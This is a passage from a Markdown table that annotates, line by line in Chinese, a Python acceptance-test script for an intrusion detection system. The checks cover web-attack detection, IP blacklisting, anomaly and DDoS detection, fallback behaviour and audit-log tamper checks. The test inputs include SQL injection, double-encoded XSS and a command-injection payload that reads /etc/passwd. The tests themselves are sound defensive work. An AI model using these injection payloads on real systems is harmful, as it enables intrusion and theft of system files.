| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 函数定义：声明 `_wf` 的输入、处理逻辑和返回结果。 | `def _wf(url: str, src_ip: str = "198.51.100.77") -> dict:` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw = {` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "url": url,` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "http_method": "GET",` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "status_code": 200,` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "response_size": 100,` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "src_ip": src_ip,` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 55 | 返回结果：把处理后的值交回调用方。 | `    return WebFeatureExtractor().extract(raw)` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 函数定义：声明 `check_01_normal_web_no_alert` 的输入、处理逻辑和返回结果。 | `def check_01_normal_web_no_alert() -> None:` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    d = WebAttackDetector()` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feat = _wf("/api/items?id=1")` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = d.detect(feat)` |
| 62 | 条件判断：满足条件时进入对应分支。 | `    if r is None or r.threat_type != "normal":` |
| 63 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"期望 normal，得到 {r}")` |
| 64 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 函数定义：声明 `check_02_sqli_web_attack_high` 的输入、处理逻辑和返回结果。 | `def check_02_sqli_web_attack_high() -> None:` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    d = WebAttackDetector()` |
| 68 | 注释：解释下面或当前这段代码的设计意图。 | `    # 与验收文档一致：/login?u=admin' OR 1=1--` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feat = _wf("/login?u=admin' OR 1=1--")` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = d.detect(feat)` |
| 71 | 条件判断：满足条件时进入对应分支。 | `    if r is None:` |
| 72 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError("未检测到攻击")` |
| 73 | 条件判断：满足条件时进入对应分支。 | `    if r.threat_type != "web_attack" or r.threat_level != "high":` |
| 74 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"期望 web_attack high，得到 {r.threat_type} {r.threat_level}")` |
| 75 | 条件判断：满足条件时进入对应分支。 | `    if "sql" not in (r.details or "").lower():` |
| 76 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"details 应含 sql 线索: {r.details}")` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 79 | 函数定义：声明 `check_03_double_encoded_xss_high` 的输入、处理逻辑和返回结果。 | `def check_03_double_encoded_xss_high() -> None:` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    d = WebAttackDetector()` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feat = _wf("/q=%253Cscript%253Ealert(1)%253C%252Fscript%253E")` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = d.detect(feat)` |
| 83 | 条件判断：满足条件时进入对应分支。 | `    if r is None or r.threat_type != "web_attack" or r.threat_level != "high":` |
| 84 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"期望 web_attack high，得到 {r}")` |
| 85 | 条件判断：满足条件时进入对应分支。 | `    if "xss" not in (r.details or "").lower():` |
| 86 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"期望 xss: {r.details}")` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 89 | 函数定义：声明 `check_04_cmd_injection_high` 的输入、处理逻辑和返回结果。 | `def check_04_cmd_injection_high() -> None:` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    d = WebAttackDetector()` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feat = _wf("/ping?host=127.0.0.1;cat /etc/passwd")` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = d.detect(feat)` |
| 93 | 条件判断：满足条件时进入对应分支。 | `    if r is None or r.threat_type != "web_attack" or r.threat_level != "high":` |
| 94 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"期望 web_attack high，得到 {r}")` |
| 95 | 条件判断：满足条件时进入对应分支。 | `    if "command" not in (r.details or "").lower():` |
| 96 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"期望 command_injection: {r.details}")` |
| 97 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 函数定义：声明 `check_05_ioc_threat_intel_high` 的输入、处理逻辑和返回结果。 | `def check_05_ioc_threat_intel_high() -> None:` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ti = ThreatIntelCollector(abuseipdb_key="", virustotal_key="")` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ip = "192.0.2.50"` |
| 102 | 条件判断：满足条件时进入对应分支。 | `    if not ti.add_ip_to_blacklist(ip):` |
| 103 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError("加入黑名单失败")` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = ti.check_ip(ip)` |
| 105 | 条件判断：满足条件时进入对应分支。 | `    if not r.get("is_malicious"):` |
| 106 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"黑名单 IP 应命中: {r}")` |
| 107 | 条件判断：满足条件时进入对应分支。 | `    if str(r.get("source", "")).lower() != "local":` |
| 108 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"期望 source=local（内存黑名单）: {r}")` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 111 | 函数定义：声明 `check_06_syn_surge_anomaly_or_ddos` 的输入、处理逻辑和返回结果。 | `def check_06_syn_surge_anomaly_or_ddos() -> None:` |
| 112 | 文档字符串：说明当前模块、类或函数的职责。 | `    """SYN 突增：优先真实模型；否则用合成 IF/AE 命中 anomaly high（替代验证）。"""` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_dir = os.environ.get("MODEL_DIR", "models/saved")` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ad = AnomalyDetector()` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reg = ModelRegistry(model_dir)` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    path = reg.resolve_load_path("anomaly")` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    loaded = False` |
| 118 | 条件判断：满足条件时进入对应分支。 | `    if path:` |
| 119 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 120 | 函数调用：执行已有函数/方法完成当前步骤。 | `            reg.try_load_detector("anomaly", ad)` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            loaded = ad.is_ready` |
| 122 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            loaded = False` |
| 124 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feat = {` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "src_ip": "10.10.10.10",` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "protocol": "tcp",` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pkt_len_mean": 50,` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_byte_count": 1000,` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_pkt_count": 100,` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "window_unique_dst_port": 10,` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "syn_count": 200,` |
| 133 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 134 | 条件判断：满足条件时进入对应分支。 | `    if loaded:` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = ad.detect(feat)` |
| 136 | 条件判断：满足条件时进入对应分支。 | `        if r is None:` |
| 137 | 抛出异常：主动报告不可继续的错误。 | `            raise AssertionError("异常模型已加载但无输出（调整特征或检查模型）")` |
| 138 | 条件判断：满足条件时进入对应分支。 | `        if r.threat_type not in ("anomaly", "ddos"):` |
| 139 | 抛出异常：主动报告不可继续的错误。 | `            raise AssertionError(f"期望 anomaly/ddos 类，得到 {r.threat_type}")` |
| 140 | 条件判断：满足条件时进入对应分支。 | `        if r.threat_level not in ("high", "medium", "critical"):` |
| 141 | 抛出异常：主动报告不可继续的错误。 | `            raise AssertionError(f"期望中高等级告警: {r.threat_level}")` |
| 142 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 143 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 144 | 注释：解释下面或当前这段代码的设计意图。 | `    # 替代验证：与 tests/test_detectors.py 一致的双模型命中 → anomaly high` |
| 145 | 类定义：声明 `_FakeIF`，封装相关状态与行为。 | `    class _FakeIF:` |
| 146 | 函数定义：声明 `predict` 的输入、处理逻辑和返回结果。 | `        def predict(self, X):  # noqa: ANN001` |
| 147 | 返回结果：把处理后的值交回调用方。 | `            return [-1]` |
| 148 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 149 | 类定义：声明 `_FakeScaler`，封装相关状态与行为。 | `    class _FakeScaler:` |
| 150 | 函数定义：声明 `transform` 的输入、处理逻辑和返回结果。 | `        def transform(self, X):  # noqa: ANN001` |
| 151 | 返回结果：把处理后的值交回调用方。 | `            return X` |
| 152 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 153 | 类定义：声明 `_FakeAE`，封装相关状态与行为。 | `    class _FakeAE:` |
| 154 | 函数定义：声明 `predict` 的输入、处理逻辑和返回结果。 | `        def predict(self, X, verbose=0):  # noqa: ANN001` |
| 155 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `            import numpy as np` |
| 156 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 157 | 返回结果：把处理后的值交回调用方。 | `            return np.zeros_like(X)` |
| 158 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ad2 = AnomalyDetector()` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ad2.if_model = _FakeIF()` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ad2.ae_model = _FakeAE()` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ad2.ae_scaler = _FakeScaler()` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ad2.ae_threshold = 0.001` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r2 = ad2.detect(feat)` |
| 165 | 条件判断：满足条件时进入对应分支。 | `    if r2 is None or r2.threat_type != "anomaly":` |
| 166 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError("替代路径应产生 anomaly")` |
| 167 | 条件判断：满足条件时进入对应分支。 | `    if r2.threat_level != "high":` |
| 168 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"期望 high，得到 {r2.threat_level}")` |
| 169 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 170 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 171 | 函数定义：声明 `check_07_model_missing_other_engines_continue` 的输入、处理逻辑和返回结果。 | `def check_07_model_missing_other_engines_continue(tmp_path: Path) -> None:` |
| 172 | 文档字符串：说明当前模块、类或函数的职责。 | `    """删除一类模型文件后：该引擎不可用，Web 规则引擎仍拦截 SQLi。"""` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ddst = tmp_path / "models_saved"` |
| 174 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ddst.mkdir(parents=True)` |
| 175 | 注释：解释下面或当前这段代码的设计意图。 | `    # 复制仓库内可读模型（若不存在则仅测 Web 规则 + DDoS 未就绪）` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    repo_models = _PROJECT_ROOT / "models" / "saved"` |
| 177 | 条件判断：满足条件时进入对应分支。 | `    if repo_models.is_dir():` |
| 178 | 循环：逐个处理集合或迭代器中的元素。 | `        for name in os.listdir(repo_models):` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            p = repo_models / name` |
| 180 | 条件判断：满足条件时进入对应分支。 | `            if p.is_file():` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `                shutil.copy2(p, ddst / name)` |
| 182 | 注释：解释下面或当前这段代码的设计意图。 | `    # 移除 ddos 模型文件（若存在）` |
| 183 | 循环：逐个处理集合或迭代器中的元素。 | `    for cand in ("ddos_rf_v1.pkl",):` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cp = ddst / cand` |
| 185 | 条件判断：满足条件时进入对应分支。 | `        if cp.is_file():` |
| 186 | 函数调用：执行已有函数/方法完成当前步骤。 | `            cp.unlink()` |
| 187 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 188 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    dd = DDoSDetector()` |
| 189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mr = ModelRegistry(str(ddst))` |
| 190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    p = mr.resolve_load_path("ddos")` |
| 191 | 条件判断：满足条件时进入对应分支。 | `    if p and os.path.isfile(p):` |
| 192 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 193 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mr.try_load_detector("ddos", dd)` |
| 194 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:` |
| 195 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 196 | 条件判断：满足条件时进入对应分支。 | `    if dd.is_ready and (ddst / "ddos_rf_v1.pkl").exists():` |
| 197 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError("预期 DDoS 模型应缺失或加载失败")` |
| 198 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    wd = WebAttackDetector()` |
| 200 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feat = _wf("/api?id=1' OR 1=1--")` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rw = wd.detect(feat)` |
| 202 | 条件判断：满足条件时进入对应分支。 | `    if rw is None or rw.threat_type != "web_attack":` |
| 203 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError("Web 规则引擎应在无 ML 时仍工作")` |
| 204 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 205 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 206 | 函数定义：声明 `check_08_redis_downgrade_memory_mode` 的输入、处理逻辑和返回结果。 | `def check_08_redis_downgrade_memory_mode() -> None:` |
| 207 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.utils.redis_client import RedisClient  # noqa: PLC0415` |
| 208 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    c = RedisClient(host="127.0.0.1", port=63999, password="nope")` |
| 210 | 条件判断：满足条件时进入对应分支。 | `    if c.mode != "memory":` |
| 211 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(f"无法连接时应为 memory 模式，当前 {c.mode}")` |
| 212 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 213 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 214 | 函数定义：声明 `check_09_audit_tamper_fails_integrity` 的输入、处理逻辑和返回结果。 | `def check_09_audit_tamper_fails_integrity(tmp_path: Path) -> None:` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    logd = tmp_path / "logs"` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sl = SecurityLogger(log_dir=str(logd), enable_integrity=True)` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sl.log_event("test", "info", {"k": 1})` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sl.log_event("test", "info", {"k": 2})` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    logf = Path(sl.log_file)` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    text = logf.read_text(encoding="utf-8")` |
| 221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    lines = text.strip().split("\n")` |
| 222 | 条件判断：满足条件时进入对应分支。 | `    if len(lines) < 2:` |
| 223 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError("日志行数不足")` |
| 224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    obj = json.loads(lines[0])` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    obj["tampered"] = True` |
| 226 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    lines[0] = json.dumps(obj, ensure_ascii=False)` |
| 227 | 函数调用：执行已有函数/方法完成当前步骤。 | `    logf.write_text("\n".join(lines) + "\n", encoding="utf-8")` |
| 228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v = sl.verify_integrity(str(logf))` |
| 229 | 条件判断：满足条件时进入对应分支。 | `    if v.get("valid"):` |
| 230 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError("篡改后校验应失败")` |
| 231 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _release_security_logger_handlers(sl)` |
| 232 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 233 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 234 | 函数定义：声明 `check_10_web_restart_alerts_queryable` 的输入、处理逻辑和返回结果。 | `def check_10_web_restart_alerts_queryable(` |
| 235 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    monkeypatch, tmp_path: Path` |
| 236 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> None:` |
| 237 | 文档字符串：说明当前模块、类或函数的职责。 | `    """同一 DATABASE_URL 下新进程仍可查询历史告警（模拟重启）。"""` |
| 238 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "e2e_restart.db"` |
| 240 | 条件判断：满足条件时进入对应分支。 | `    if monkeypatch:` |
| 241 | 函数调用：执行已有函数/方法完成当前步骤。 | `        monkeypatch.setenv("FLASK_ENV", "testing")` |
| 242 | 函数调用：执行已有函数/方法完成当前步骤。 | `        monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 243 | 函数调用：执行已有函数/方法完成当前步骤。 | `        monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 244 | 函数调用：执行已有函数/方法完成当前步骤。 | `        monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 245 | 函数调用：执行已有函数/方法完成当前步骤。 | `        monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 246 | 函数调用：执行已有函数/方法完成当前步骤。 | `        monkeypatch.setenv("ALERT_STREAM_CONSUMER_AUTOSTART", "false")` |
| 247 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 248 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app, push_alert  # noqa: E402` |
| 249 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 250 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app1, _ = create_app()` |
| 251 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app1.config["TESTING"] = True` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    c1 = app1.test_client()` |
| 253 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    t1 = c1.post(` |
| 254 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "/api/auth/login", json={"username": "admin", "password": "changeme"}` |
| 255 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ).get_json()["access_token"]` |
| 256 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    h1 = {"Authorization": f"Bearer {t1}"}` |
| 257 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 258 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    aid = uuid.uuid4().hex` |
| 259 | 上下文管理：自动管理资源打开与释放。 | `    with app1.app_context():` |
| 260 | 函数调用：执行已有函数/方法完成当前步骤。 | `        push_alert(` |
| 261 | 代码语句：参与当前文件的业务流程或数据处理。 | `            app1,` |
| 262 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "id": aid,` |
| 264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "timestamp": datetime.now(timezone.utc).isoformat(),` |
| 265 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source_ip": "203.0.113.1",` |
| 266 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "threat_type": "web_attack",` |
| 267 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "level": "high",` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": "open",` |
| 269 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "summary": "e2e restart",` |
| 270 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 271 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 272 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 273 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app2, _ = create_app()` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app2.config["TESTING"] = True` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    c2 = app2.test_client()` |
| 276 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    t2 = c2.post(` |
| 277 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "/api/auth/login", json={"username": "admin", "password": "changeme"}` |
| 278 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ).get_json()["access_token"]` |
| 279 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    h2 = {"Authorization": f"Bearer {t2}"}` |
| 280 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = c2.get("/api/alerts", headers=h2)` |
| 281 | 条件判断：满足条件时进入对应分支。 | `    if r.status_code != 200:` |
| 282 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError(r.get_data(as_text=True))` |
| 283 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    data = r.get_json()` |
| 284 | 条件判断：满足条件时进入对应分支。 | `    if not any(x.get("id") == aid for x in data):` |
| 285 | 抛出异常：主动报告不可继续的错误。 | `        raise AssertionError("重启后应仍能查到历史告警")` |
| 286 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 287 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 288 | 函数定义：声明 `all_checks_plain` 的输入、处理逻辑和返回结果。 | `def all_checks_plain() -> List[Tuple[str, Callable[[], None]]]:` |
| 289 | 文档字符串：说明当前模块、类或函数的职责。 | `    """无需 pytest tmp/monkeypatch 的场景。"""` |
| 290 | 返回结果：把处理后的值交回调用方。 | `    return [` |
| 291 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("1 正常 Web /api/items?id=1 无误报", check_01_normal_web_no_alert),` |
| 292 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("2 SQL 注入 → web_attack high", check_02_sqli_web_attack_high),` |
| 293 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("3 双层编码 XSS → web_attack high", check_03_double_encoded_xss_high),` |
| 294 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("4 命令注入 → web_attack high", check_04_cmd_injection_high),` |
| 295 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("5 IOC 黑名单 → threat_intel 语义", check_05_ioc_threat_intel_high),` |
| 296 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("6 SYN 突增 → anomaly/(或 ddos)", check_06_syn_surge_anomaly_or_ddos),` |
| 297 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("8 Redis 中断 → 客户端降级 memory", check_08_redis_downgrade_memory_mode),` |
| 298 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ]` |
| 299 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 300 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 301 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> int:` |
| 302 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    failed = 0` |
| 303 | 循环：逐个处理集合或迭代器中的元素。 | `    for name, fn in all_checks_plain():` |
| 304 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 305 | 函数调用：执行已有函数/方法完成当前步骤。 | `            fn()` |
| 306 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print(f"[PASS] {name}")` |
| 307 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 308 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print(f"[FAIL] {name}: {exc}")` |
| 309 | 代码语句：参与当前文件的业务流程或数据处理。 | `            failed += 1` |
| 310 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 311 | 注释：解释下面或当前这段代码的设计意图。 | `    # 7 模型缺失（临时目录）` |
| 312 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `    import tempfile` |
| 313 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 314 | 上下文管理：自动管理资源打开与释放。 | `    with tempfile.TemporaryDirectory() as td:` |
| 315 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        tdp = Path(td)` |
| 316 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 317 | 函数调用：执行已有函数/方法完成当前步骤。 | `            check_07_model_missing_other_engines_continue(tdp)` |
| 318 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print("[PASS] 7 模型缺失：其余引擎继续")` |
| 319 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 320 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print(f"[FAIL] 7 模型缺失：其余引擎继续: {exc}")` |
| 321 | 代码语句：参与当前文件的业务流程或数据处理。 | `            failed += 1` |
| 322 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 323 | 注释：解释下面或当前这段代码的设计意图。 | `    # 9 审计篡改` |
| 324 | 上下文管理：自动管理资源打开与释放。 | `    with tempfile.TemporaryDirectory() as td:` |
| 325 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        tdp = Path(td)` |
| 326 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 327 | 函数调用：执行已有函数/方法完成当前步骤。 | `            check_09_audit_tamper_fails_integrity(tdp)` |
| 328 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print("[PASS] 9 审计篡改 → 完整性失败")` |
| 329 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 330 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print(f"[FAIL] 9 审计篡改: {exc}")` |
| 331 | 代码语句：参与当前文件的业务流程或数据处理。 | `            failed += 1` |
| 332 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
